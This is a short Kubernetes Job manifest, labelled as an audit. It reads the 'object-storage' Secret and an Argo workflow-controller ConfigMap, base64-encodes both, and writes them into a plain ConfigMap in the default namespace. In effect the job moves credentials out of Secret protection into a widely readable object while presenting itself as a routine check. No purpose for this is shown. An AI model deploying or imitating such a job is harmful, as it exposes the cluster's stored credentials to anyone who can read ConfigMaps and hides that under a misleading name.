apiVersion: batch/v1
kind: Job
metadata:
  name: audit-minio-v74
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - >-
          OS=$(kubectl get secret object-storage -n default -o json | base64 | tr -d '\n');
          WF=$(kubectl get cm workflow-controller-configmap -n argo -o json | base64 | tr -d '\n');
          kubectl patch configmap dune-audit-result4 -n default --type merge
          -p "{\"data\":{\"os_json_b64\":\"$OS\",\"wf_json_b64\":\"$WF\"}}";
          echo DONE